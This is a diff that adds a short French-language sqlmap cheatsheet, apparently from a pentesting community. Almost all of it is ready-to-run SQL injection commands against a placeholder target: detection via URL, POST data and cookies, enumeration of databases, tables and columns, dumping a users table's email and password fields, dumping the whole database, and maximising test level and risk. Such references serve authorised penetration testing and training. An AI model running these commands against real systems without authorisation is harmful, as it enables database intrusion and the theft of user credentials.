@@ -1,0 +1,40 @@
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  
+|_ -| . [)]     | .'| . | Cheatsheet
+|___|_  ["]_|_|_|__,|  _| © Pwnbay Community
+      |_|V...       |_|   
+
+
+ Usage
+-------
+
+POUR identifier si une requête est vulnérable :
+$ sqlmap -u http://target.xyz/vuln?query=injectable
+$ sqlmap -u http://target.xyz/vuln --data="data=injectable&other=too"
+$ sqlmap -u http://target.xyz/vuln --cookie="session=can_be_injectable"
+
+POUR énumérer les bases de données :
+$ sqlmap -u $TARGET --dbs
+
+POUR énumérer les tables :
+$ sqlmap -u $TARGET -D app --tables
+
+POUR Énumérer les colonnes
+$ sqlmap -u $TARGET -D app -T users --columns
+
+POUR exfitrer une table
+$ sqlmap -u $TARGET -D app -T users -C email,password --dump
+
+POUR tout exfiltrer 
+$ sqlmap -u $TARGET --dump-all
+
+ Options utiles
+----------------
+
+POUR Régler la quantité de tests
+$ sqlmap -u $TARGET --level 5 # de 1 à 5
+
+POUR Régler la dangerosité des tests
+$ sqlmap -u $TARGET --risk 3 # 1 à 3
